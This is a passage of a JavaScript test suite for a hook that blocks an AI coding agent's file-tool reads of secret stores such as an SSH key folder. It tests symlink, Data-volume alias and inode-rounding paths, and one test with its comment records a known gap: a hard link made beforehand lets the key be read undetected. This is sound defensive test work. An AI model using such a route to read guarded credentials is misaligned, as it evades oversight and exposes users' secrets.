  const call = (tool, input) => confineDenial({ session_id: SESSION, tool_name: tool, tool_input: input, cwd: at.work }, { mark, env: {} });
  // A hard link in the clone to a store's file: no link to resolve, one file on the disk.
  linkSync(at.secret, path.join(at.work, 'notes'));
  assert.match(call('Read', { file_path: path.join(at.work, 'notes') })?.reason ?? '', /hides/u, 'a hard link to a store');
  assert.match(call('Read', { file_path: 'notes' })?.reason ?? '', /hides/u, 'the same, relative to the call\'s folder');
  assert.equal(call('Read', { file_path: path.join(at.work, 'README.md') }), null, 'a file of the clone of its own');
  assert.equal(call('LS', { path: at.work }), null, 'the clone, which holds no store');
});

// The documented limit (docs/providers/claude-code.md, the sandbox proof): only a store's own identity and those of the
// folders above it are known, so a hard link made beforehand to a file inside a store folder is not caught. Pinned
// here so the limit stays deliberate: a change that starts catching it updates that doc and this test together.
test('a file-tool read through a hard link made beforehand to a file inside a store folder is not detected', (t) => {
  const at = attempt(t);
  plan(at);
  const mark = { root: at.root, cwd: at.work, project: 'launch', issue: 'ENG-1', confine: 'passed' };
  const call = (tool, input) => confineDenial({ session_id: SESSION, tool_name: tool, tool_input: input, cwd: at.work }, { mark, env: {} });
  linkSync(path.join(at.keys, 'id_test'), path.join(at.work, 'key-copy'));
  assert.match(call('Read', { file_path: path.join(at.keys, 'id_test') })?.reason ?? '', /hides/u, 'the file by its own path');
  assert.equal(call('Read', { file_path: path.join(at.work, 'key-copy') }), null, 'the same file by a hard link outside the store folder');
});

test('a file`s identity keeps an inode past 2^53 whole, where a plain number rounds two files` inodes alike', () => {
  const inodes = { '/a': 2n ** 60n + 4n, '/b': 2n ** 60n + 40n };
  assert.equal(Number(inodes['/a']), Number(inodes['/b']), 'the two inodes round alike as plain numbers');
  // As statSync: big integers only when asked for them, plain numbers otherwise.
  const stat = (file, options) => (options?.bigint ? { dev: 7n, ino: inodes[file] } : { dev: 7, ino: Number(inodes[file]) });
  assert.notEqual(identity('/a', stat), identity('/b', stat));
  assert.equal(identity('/a', stat), identity('/a', stat));
  assert.equal(identity('/gone', () => { throw new Error('ENOENT'); }), null, 'a file that is not there');
});

test('a file-tool read of a file beside a store, through a linked folder above both, is no store', (t) => {
  const at = attempt(t);
  // As /bin is a link to usr/bin on Linux: the store and its neighbour sit in a folder reached by a link.
  const folder = path.join(at.root, 'usr', 'bin');
  mkdirSync(folder, { recursive: true });
  for (const name of ['cat', 'ls']) writeFileSync(path.join(folder, name), name);
  const linked = path.join(at.root, 'bin');
  symlinkSync(path.join('usr', 'bin'), linked);
  plan(at, { reads: [at.secret, at.keys, path.join(linked, 'cat')] });
  const mark = { root: at.root, cwd: at.work, project: 'launch', issue: 'ENG-1', confine: 'passed' };
  const call = (file) => confineDenial({ session_id: SESSION, tool_name: 'Read', tool_input: { file_path: file }, cwd: at.work }, { mark, env: {} });
  assert.match(call(path.join(linked, 'cat'))?.reason ?? '', /hides/u, 'the store by the link');
  assert.match(call(path.join(folder, 'cat'))?.reason ?? '', /hides/u, 'the store by its real path');
  assert.equal(call(path.join(linked, 'ls')), null, 'the file beside it by the link');
  assert.equal(call(path.join(folder, 'ls')), null, 'the file beside it by its real path');
  assert.match(call(linked)?.reason ?? '', /hides/u, 'the folder that holds the store');
});

// Two files on this disk whose exact identities differ but round alike as plain numbers, as /bin/cat's and /bin/ls's
// on macOS, where an APFS inode passes 2^53; else the reason the test below cannot run here. On Linux both can be one
// file: a multicall coreutils binary, hard linked under each name, is one identity, and a read of either is the store.
function roundingPair(first, second) {
  try {
    const [a, b] = [first, second].map((file) => statSync(file, { bigint: true }));
    if (a.dev === b.dev && a.ino === b.ino) return { skip: `${first} and ${second} are one file here` };
    if (Number(a.dev) !== Number(b.dev) || Number(a.ino) !== Number(b.ino)) return { skip: `${first}'s and ${second}'s identities do not round alike here` };
    return { skip: false };
  } catch {
    return { skip: `no ${first} or ${second} here` };
  }
}

test('a file-tool read matches a store by its exact inode, so a file whose inode rounds alike is no store', roundingPair('/bin/cat', '/bin/ls'), (t) => {
  const at = attempt(t);
  plan(at, { reads: [at.secret, at.keys, '/bin/cat'] });
  const mark = { root: at.root, cwd: at.work, project: 'launch', issue: 'ENG-1', confine: 'passed' };
  const call = (file) => confineDenial({ session_id: SESSION, tool_name: 'Read', tool_input: { file_path: file }, cwd: at.work }, { mark, env: {} });
  assert.match(call('/bin/cat')?.reason ?? '', /hides/u, 'the store');
  assert.equal(call('/bin/ls'), null, 'another file beside it');
});

// On macOS, the Data volume's own path to a folder is the same folder as its standard path, with another real path.
test('a file-tool read of a store through the macOS Data volume`s path to it reaches that store', { skip: process.platform !== 'darwin' }, (t) => {
  const at = attempt(t);
  plan(at);
  const alias = (file) => `/System/Volumes/Data${file}`;
  if (!existsSync(alias(at.home)) || realpathSync.native(alias(at.home)) === at.home) return t.skip('no Data volume path to the temporary folder');
  const mark = { root: at.root, cwd: at.work, project: 'launch', issue: 'ENG-1', confine: 'passed' };
  const call = (tool, input) => confineDenial({ session_id: SESSION, tool_name: tool, tool_input: input, cwd: at.work }, { mark, env: {} });
  for (const [tool, input] of [['Read', { file_path: alias(at.secret) }], ['Read', { file_path: alias(path.join(at.keys, 'id_test')) }], ['Grep', { pattern: 'x', path: alias(at.keys) }],
    ['Grep', { pattern: 'x', path: alias(at.home) }], ['LS', { path: alias(at.keys) }], ['Glob', { pattern: '*', path: alias(at.home) }], ['Read', { file_path: alias(path.join(at.keys, 'gone')) }]]) {
    assert.match(call(tool, input)?.reason ?? '', /hides/u, `${tool} ${JSON.stringify(input)}`);
  }
  assert.equal(call('Read', { file_path: alias(path.join(at.work, 'README.md')) }), null, 'the clone by the same path');
  // The Data volume's root and each folder above it hold every store by its Data volume path, though no standard path.
  for (const folder of ['/System/Volumes/Data', '/System/Volumes', '/System']) {
    assert.match(call('Grep', { pattern: 'x', path: folder })?.reason ?? '', /hides/u, `Grep ${folder}`);
    assert.match(call('Glob', { pattern: '**/*', path: folder })?.reason ?? '', /hides/u, `Glob ${folder}`);
  }
});

// On macOS, a folder the Data volume holds under the same path is not always the same folder: /usr/share is the sealed
// system volume's, and /System/Volumes/Data/usr/share another folder. A store's Data volume path counts only when it
// is the store itself, by its exact identity; else the reason the test below cannot run here.
function unrelatedDataPath(store) {
  if (process.platform !== 'darwin') return { skip: 'macOS only: no Data volume elsewhere' };
  const data = `/System/Volumes/Data${store}`;
  const [a, b] = [identity(store), identity(data)];
  if (!a || !b) return { skip: `no ${store} or ${data} here` };
  return a === b ? { skip: `${data} is ${store} itself here` } : { skip: false };
}

test('a file-tool read of a folder at a store`s Data volume path that is another folder is no store', unrelatedDataPath('/usr/share'), (t) => {
  const at = attempt(t);
  plan(at, { reads: [at.secret, at.keys, '/usr/share'] });
  const mark = { root: at.root, cwd: at.work, project: 'launch', issue: 'ENG-1', confine: 'passed' };
  const call = (tool, input) => confineDenial({ session_id: SESSION, tool_name: tool, tool_input: input, cwd: at.work }, { mark, env: {} });
  const data = '/System/Volumes/Data/usr/share';
  assert.match(call('LS', { path: '/usr/share' })?.reason ?? '', /hides/u, 'the store by its own path');
  assert.equal(call('LS', { path: data }), null, 'the other folder at its Data volume path');
  assert.equal(call('Read', { file_path: path.join(data, 'gone') }), null, 'a file under that other folder');
  // A store whose Data volume path is the store itself, the temporary home folder, is still reached through it.
  if (existsSync(`/System/Volumes/Data${at.keys}`)) assert.match(call('LS', { path: `/System/Volumes/Data${at.keys}` })?.reason ?? '', /hides/u, 'a store by its own Data volume path');
});
